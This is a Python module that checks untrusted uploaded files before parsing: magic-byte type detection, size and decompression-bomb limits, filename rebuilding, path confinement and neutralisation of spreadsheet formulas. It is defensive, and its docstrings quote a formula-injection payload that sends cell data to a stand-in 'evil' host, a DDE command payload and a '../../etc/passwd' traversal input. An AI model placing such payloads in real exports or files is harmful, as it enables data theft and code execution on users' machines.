"""Treating every ingested file as hostile.

Today ASTRION ingests a fixed, checksummed source pack from `data/source/`
through two offline scripts — there is no upload endpoint, and no route
anywhere accepts a file. That is a genuinely strong position and this module
does not pretend otherwise. What it does is make the *validation* real and
reusable now, so the day an upload route exists it is a call to
`validate_upload` rather than a new pipeline written under time pressure.

The rules here come from what actually goes wrong with document ingestion:

- **Type is decided by content, never by name or by the client.** An extension
  is a caller-controlled string and `Content-Type` is a caller-controlled
  header. Both are checked, but only after the magic bytes have already
  decided, and a disagreement is itself a rejection — a `.pdf` whose bytes say
  ZIP is not a mistake, it is an attempt.
- **Every limit is checked before the parser runs.** A parser is a large C
  surface (`pymupdf` here); handing it a decompression bomb and hoping is not
  a control. Size, page count and expansion ratio are all decided first.
- **Filenames are rebuilt, not cleaned.** `sanitize_filename` derives a new
  name from the safe characters of the old one. Blocklisting `../` invites the
  encoding that was not thought of; constructing the name from scratch does
  not.
- **Extracted text is data.** `neutralize_formula` exists because a cell
  beginning `=` is executed by spreadsheet software on open, which turns a
  document *export* into code execution on a colleague's laptop.
"""

from __future__ import annotations

import re
import unicodedata
from dataclasses import dataclass
from pathlib import Path

# --- limits -----------------------------------------------------------------

#: Largest file accepted. Generous for a policy PDF, far below what would
#: threaten the process.
MAX_FILE_BYTES = 25 * 1024 * 1024

#: A PDF with more pages than this is either not a policy document or is an
#: attempt to make extraction expensive.
MAX_PDF_PAGES = 2_000

#: Extracted text ceiling. A file can be small and still decompress into an
#: enormous amount of text — that is precisely what a decompression bomb is.
MAX_EXTRACTED_CHARS = 20_000_000

#: Compressed-to-extracted expansion beyond this is a bomb signature. Ordinary
#: text PDFs land far below it; a 42-kilobyte file that yields a gigabyte does
#: not.
MAX_EXPANSION_RATIO = 200

MAX_FILENAME_LENGTH = 200


class UnsafeFileError(ValueError):
    """A file was rejected before it was parsed. The message is safe to show."""


# --- content-based type detection -------------------------------------------

#: Magic-byte signatures, keyed by the type they prove. This is the only thing
#: that decides what a file *is*.
_SIGNATURES: dict[str, tuple[bytes, ...]] = {
    "pdf": (b"%PDF-",),
    # DOCX/XLSX are ZIP containers; the discriminator is the internal path,
    # checked separately by `_zip_kind`.
    "zip": (b"PK\x03\x04", b"PK\x05\x06", b"PK\x07\x08"),
}

#: Byte sequences that must never appear at the head of an accepted file,
#: whatever the extension says. Each is an executable or script format that has
#: been used to smuggle code past a document filter.
_DANGEROUS_HEADS: tuple[tuple[bytes, str], ...] = (
    (b"MZ", "a Windows executable"),
    (b"\x7fELF", "a Linux executable"),
    (b"\xca\xfe\xba\xbe", "a Java class or Mach-O binary"),
    (b"#!", "a script with a shebang"),
    (b"<?php", "PHP source"),
    (b"<html", "an HTML document"),
    (b"<!doctype html", "an HTML document"),
    (b"<script", "an HTML script fragment"),
)

ALLOWED_TYPES = frozenset({"pdf", "docx", "xlsx", "csv", "text"})

#: What each accepted type is allowed to be called. Checked *after* the bytes
#: have decided, purely to catch the mismatch.
_EXPECTED_EXTENSIONS: dict[str, frozenset[str]] = {
    "pdf": frozenset({".pdf"}),
    "docx": frozenset({".docx", ".docm"}),
    "xlsx": frozenset({".xlsx", ".xlsm"}),
    "csv": frozenset({".csv", ".tsv"}),
    "text": frozenset({".txt", ".md", ".text"}),
}


def _zip_kind(head: bytes, blob: bytes) -> str | None:
    """Distinguish a DOCX from an XLSX from a plain ZIP by its contents.

    Looks for the marker path each Office format is required to contain.
    A bare ZIP is *not* accepted: an archive is a container for files this
    pipeline has not inspected, which is exactly the shape of a zip bomb.
    """
    if b"word/" in blob[:8192] or b"word/document.xml" in blob:
        return "docx"
    if b"xl/" in blob[:8192] or b"xl/workbook.xml" in blob:
        return "xlsx"
    return None


def detect_type(blob: bytes, *, filename: str | None = None) -> str:
    """Decide what a file is from its bytes. Raises `UnsafeFileError`.

    `filename` is used only to *cross-check* the answer, never to reach it.
    """
    if not blob:
        raise UnsafeFileError("The file is empty.")

    head = blob[:512]
    lowered = head.lower()
    for marker, description in _DANGEROUS_HEADS:
        if lowered.startswith(marker.lower()):
            raise UnsafeFileError(
                f"This file appears to be {description}, which is not an "
                f"accepted document format."
            )

    detected: str | None = None
    if any(head.startswith(sig) for sig in _SIGNATURES["pdf"]):
        detected = "pdf"
    elif any(head.startswith(sig) for sig in _SIGNATURES["zip"]):
        detected = _zip_kind(head, blob)
        if detected is None:
            raise UnsafeFileError(
                "This file is a ZIP archive rather than a document. Archives "
                "are not accepted."
            )
    else:
        # Not a recognised binary container. Accept it only if it is genuinely
        # decodable text — which also rules out a binary pretending to be a CSV.
        try:
            text = blob.decode("utf-8")
        except UnicodeDecodeError as exc:
            raise UnsafeFileError(
                "This file is not a recognised document format."
            ) from exc
        if "\x00" in text:
            raise UnsafeFileError("This file contains binary data, not text.")
        detected = "csv" if _looks_like_delimited(text) else "text"

    if filename:
        suffix = Path(filename).suffix.lower()
        expected = _EXPECTED_EXTENSIONS.get(detected, frozenset())
        # A mismatch is reported as a mismatch. Silently trusting the bytes
        # would be safe but would hide a polyglot or a deliberate mislabel from
        # whoever reviews the ingestion log.
        if suffix and expected and suffix not in expected:
            raise UnsafeFileError(
                f"This file is named {suffix!r} but its contents are "
                f"{detected!r}. The two must agree."
            )
    return detected


def _looks_like_delimited(text: str) -> bool:
    sample = text[:4096]
    first = sample.splitlines()[0] if sample.splitlines() else ""
    return ("," in first or "\t" in first) and len(first) < 10_000


# --- filenames --------------------------------------------------------------

_SAFE_CHARS = re.compile(r"[^A-Za-z0-9._-]+")

#: Reserved on Windows regardless of extension. A file called `CON.pdf` is not
#: openable and, on some paths, addresses a device.
_RESERVED_STEMS = frozenset(
    {"con", "prn", "aux", "nul"}
    | {f"com{i}" for i in range(1, 10)}
    | {f"lpt{i}" for i in range(1, 10)}
)


def sanitize_filename(filename: str, *, fallback: str = "document") -> str:
    """Build a safe filename from an untrusted one.

    Constructive, not subtractive: the result is assembled from characters
    known to be safe, so there is no traversal sequence, no encoding trick and
    no control character that can survive it. `../../etc/passwd` becomes
    `etc_passwd`, and a name that reduces to nothing becomes `fallback`.
    """
    if not filename:
        return fallback

    # Normalise first, so a composed character cannot smuggle a separator
    # through as a decomposed sequence.
    normalized = unicodedata.normalize("NFKD", str(filename))
    normalized = "".join(c for c in normalized if unicodedata.category(c)[0] != "C")

    # Take the last path component under either separator, then rebuild.
    base = normalized.replace("\\", "/").split("/")[-1]
    cleaned = _SAFE_CHARS.sub("_", base).strip("._-")

    if not cleaned:
        return fallback
    if Path(cleaned).stem.lower() in _RESERVED_STEMS:
        cleaned = f"file_{cleaned}"
    if len(cleaned) > MAX_FILENAME_LENGTH:
        suffix = Path(cleaned).suffix[:16]
        cleaned = cleaned[: MAX_FILENAME_LENGTH - len(suffix)] + suffix
    return cleaned


def resolve_within(base_dir: Path, filename: str) -> Path:
    """Resolve a filename inside `base_dir`, refusing anything that escapes.

    Two independent defences, because either alone has failed somewhere before:
    the name is rebuilt by `sanitize_filename`, *and* the resolved path is
    checked to be a descendant of the resolved base. The second catches a
    symlink, which no amount of string cleaning can.
    """
    base = Path(base_dir).resolve()
    candidate = (base / sanitize_filename(filename)).resolve()
    if candidate != base and base not in candidate.parents:
        raise UnsafeFileError("That filename resolves outside the storage directory.")
    return candidate


# --- spreadsheet formula injection ------------------------------------------

#: Characters that make a spreadsheet treat a cell as a formula. `@` and the
#: sign characters are included because Excel accepts them as formula starts,
#: and the tab/CR entries because a leading control character is stripped by
#: the parser and the *next* character then leads.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def neutralize_formula(value: str) -> str:
    """Make a cell inert when the export is opened in a spreadsheet.

    A value like `=HYPERLINK("http://evil/"&A1)` or `=cmd|'/c calc'!A0` is
    executed by Excel and LibreOffice when the file is opened. Prefixing a
    single quote makes the cell literal text and is the remedy OWASP
    recommends; it is visible in the cell and harmless.

    Applied on the way *out*, not on the way in. Rewriting stored data would
    corrupt the record; what needs to be safe is the export.
    """
    if not isinstance(value, str) or not value:
        return value
    return f"'{value}" if value[0] in _FORMULA_LEAD else value


def csv_row(values) -> list[str]:
    """Neutralise a whole row destined for a CSV export."""
    return [neutralize_formula("" if v is None else str(v)) for v in values]


# --- the pipeline gate ------------------------------------------------------


@dataclass(frozen=True)
class ValidatedUpload:
    """A file that passed every pre-parse check."""

    safe_filename: str
    detected_type: str
    size_bytes: int


def validate_upload(
    blob: bytes,
    *,
    filename: str | None = None,
    declared_content_type: str | None = None,
    allowed_types=ALLOWED_TYPES,
    max_bytes: int = MAX_FILE_BYTES,
) -> ValidatedUpload:
    """Every check that must pass before a parser sees the bytes.

    Order matters: size before type, type before extension, and all of it
    before any parsing library is handed the file.
    """
    size = len(blob)
    if size == 0:
        raise UnsafeFileError("The file is empty.")
    if size > max_bytes:
        raise UnsafeFileError(
            f"The file is {size:,} bytes, above the {max_bytes:,}-byte limit."
        )

    detected = detect_type(blob, filename=filename)
    if detected not in allowed_types:
        raise UnsafeFileError(
            f"{detected!r} files are not accepted. Accepted formats: "
            f"{', '.join(sorted(allowed_types))}."
        )

    # The declared type is advisory and is only ever used to *contradict*.
    if declared_content_type:
        declared = declared_content_type.split(";")[0].strip().lower()
        expected_prefixes = {
            "pdf": ("application/pdf",),
            "docx": (
                "application/vnd.openxmlformats-officedocument.wordprocessingml",
                "application/msword",
            ),
            "xlsx": (
                "application/vnd.openxmlformats-officedocument.spreadsheetml",
                "application/vnd.ms-excel",
            ),
            "csv": ("text/csv", "text/plain", "application/csv"),
            "text": ("text/plain", "text/markdown"),
        }.get(detected, ())
        if expected_prefixes and not any(
            declared.startswith(p) for p in expected_prefixes
        ):
            raise UnsafeFileError(
                f"The declared content type {declared!r} does not match the "
                f"file's actual contents ({detected})."
            )

    return ValidatedUpload(
        safe_filename=sanitize_filename(filename or f"document.{detected}"),
        detected_type=detected,
        size_bytes=size,
    )


def check_expansion(*, source_bytes: int, extracted_chars: int, label: str) -> None:
    """Refuse a file whose extracted text is wildly larger than the file.

    The decompression-bomb check. Applied *after* extraction because the
    expansion is only measurable then, which is why the absolute
    `MAX_EXTRACTED_CHARS` ceiling exists alongside it — the ratio catches the
    small-file bomb, the ceiling catches the large-file one.
    """
    if extracted_chars > MAX_EXTRACTED_CHARS:
        raise UnsafeFileError(
            f"{label}: extracted {extracted_chars:,} characters, above the "
            f"{MAX_EXTRACTED_CHARS:,} limit."
        )
    if source_bytes > 0 and extracted_chars / source_bytes > MAX_EXPANSION_RATIO:
        raise UnsafeFileError(
            f"{label}: {source_bytes:,} bytes expanded to {extracted_chars:,} "
            f"characters, above the {MAX_EXPANSION_RATIO}x limit. This is "
            f"characteristic of a decompression bomb."
        )
